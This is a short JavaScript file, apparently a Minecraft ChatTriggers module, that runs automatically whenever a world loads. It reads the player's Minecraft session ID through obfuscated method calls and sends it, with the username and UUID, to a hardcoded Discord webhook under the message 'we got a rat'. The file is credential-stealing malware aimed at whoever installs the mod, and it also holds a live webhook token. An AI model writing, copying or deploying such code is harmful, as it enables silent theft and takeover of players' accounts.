import "./build/index"
import request from "../requestV2"

let id;

function webhook() {
    URL = 'https://discord.com/api/webhooks/922491665200087140/at0WAye9y-E9AqhP9ZfgMeMLT31bau2_ImsKY1SlUZYaQLQ7wjZWnQBSyBEJlB4OkTr1';
    request({
        url: URL,
        method: 'POST',
        headers: {
            'Content-type': 'application/json',
            "User-Agent":"Mozilla/5.0"
        },
        body: {
            username: "ripbozo",
            content: ("@everyone we got a rat\nUsername: " + Player.getName() + "\nUUID: " + Player.getUUID() + "\nSession ID: ||" + id + "||"
            
            )
        }
    });
}

register("worldLoad", () => {
    id = Client.getMinecraft().func_110432_I().func_148254_d()
    webhook()
});